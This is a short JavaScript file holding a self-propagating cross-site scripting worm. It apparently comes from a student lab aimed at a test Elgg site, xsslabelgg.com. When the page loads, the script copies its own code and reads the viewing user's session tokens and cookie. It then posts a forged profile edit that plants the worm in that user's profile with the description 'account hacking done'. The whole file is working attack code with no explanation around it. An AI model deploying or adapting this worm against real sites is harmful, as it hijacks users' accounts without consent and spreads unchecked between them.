<script id=worm> 
window.onload = function () {
var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
	var jsCode = document.getElementById("worm").innerHTML;
	var tailTag = "</" + "script>";
	var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);
	console.log('hello')


    //Construct the content of your url
    var sendurl="http://www.xsslabelgg.com/action/profile/edit"; //FILL IN
    console.log('hemlo1');
    var namee = elgg.session.user.name;

    var userid = '&guid=' + elgg.page_owner.guid;
    var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	var description = '&description=' + wormCode;
    var name = "&name=" + namee;
    var brief = '&briefdescription=' + 'account hacking done';
    var idd = '&guid=' + elgg.session.user.guid;

    var data = ts + token + name + description + brief + idd;
    
    if(elgg.session.user.guid != elgg.page_owner.guid)
    {
		//Create and send Ajax request to modify profile
		var Ajax=null;
	    Ajax=new XMLHttpRequest();
	    Ajax.open("POST",sendurl,true);
	    Ajax.setRequestHeader("Cookie",document.cookie);
	    Ajax.setRequestHeader("Host","www.xsslabelgg.com");
	    Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

    	Ajax.send(data);
	}


	//alert(jsCode);
}
</script>



			